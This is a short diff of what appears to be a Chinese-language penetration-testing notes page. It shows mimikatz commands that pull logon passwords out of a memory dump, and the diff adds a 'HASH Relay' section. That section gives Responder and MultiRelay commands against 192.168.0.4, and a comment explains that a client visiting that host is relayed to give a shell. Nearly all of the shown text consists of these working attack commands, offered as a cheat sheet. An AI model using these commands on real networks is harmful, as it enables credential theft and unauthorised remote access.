@@ -265,6 +265,12 @@ SqlDumper.exe 1316 0 0x01100
 sekurlsa::minidump SQLDmpr0001.mdmp&quot;
 sekurlsa::logonPasswords full
 </code></pre>
+<p>HASH Relay</p>
+<pre><code>python Responder.py -I eth0
+python MultiRelay.py -t 192.168.0.4 -u ALL
+//要获取shell的目标IP
+然后客户机去访问192.168.0.4，中继到shell
+</code></pre>
 
           
           <p class="next-post">下一篇：
